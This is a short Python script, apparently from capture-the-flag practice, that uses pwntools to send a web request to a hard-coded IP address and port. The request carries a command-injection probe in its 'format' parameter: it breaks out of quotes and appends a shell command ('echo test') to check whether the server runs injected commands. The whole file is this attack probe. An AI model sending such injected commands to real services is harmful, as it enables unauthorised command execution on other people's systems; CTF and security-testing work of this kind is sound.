# python3 -m virtualenv .venv
# source .venv/bin/activate
# pip install -r requirements.txt

from pwn import *
from pwnlib.util.web import wget

url = "http://94.237.60.55:39212?format=123'\"; echo 'test';"

result = wget(url)

print(result)